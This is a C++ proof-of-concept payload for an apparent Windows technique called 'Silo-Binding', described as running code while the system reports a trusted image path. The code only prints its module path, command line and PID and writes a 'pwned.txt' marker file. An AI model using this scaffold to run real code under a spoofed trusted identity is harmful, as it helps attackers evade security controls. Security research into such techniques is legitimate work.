/*
 * payload.cpp - the "ghost" that runs under a trusted identity.
 *
 * When launched through a Silo-Binding link, this code executes while the
 * operating system still reports the *trusted* image path. GetModuleFileNameW
 * returns the shadow (virtual) path, not the backing file we really are.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

static void Out(const char* s)
{
    fputs(s, stdout);
    fflush(stdout);
}

int main(int argc, char** argv)
{
    wchar_t self[1024] = { 0 };
    GetModuleFileNameW(NULL, self, 1023);

    char narrow[2048] = { 0 };
    WideCharToMultiByte(CP_UTF8, 0, self, -1, narrow, sizeof(narrow) - 1, NULL, NULL);

    Out("\n");
    Out("  +------------------------------------------------------+\n");
    Out("  |        SILOBIND PAYLOAD EXECUTED (the ghost)         |\n");
    Out("  +------------------------------------------------------+\n");
    printf("    GetModuleFileNameW : %s\n", narrow);
    printf("    GetCommandLineW    : %ls\n", GetCommandLineW());
    printf("    PID                : %lu\n", GetCurrentProcessId());
    printf("    ImgArch            : x64\n");

    /* drop a marker so the operator can prove execution out-of-band */
    const char* marker = (argc > 1) ? argv[1] : "C:\\ProgramData\\silobind\\pwned.txt";
    HANDLE h = CreateFileA(marker, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        const char* msg = "payload executed via Silo-Binding\r\n";
        DWORD w = 0;
        WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(h);
        printf("    marker written     : %s\n", marker);
    } else {
        printf("    marker write failed: %s (err=%lu)\n", marker, GetLastError());
    }
    Out("  +------------------------------------------------------+\n");
    return 0;
}
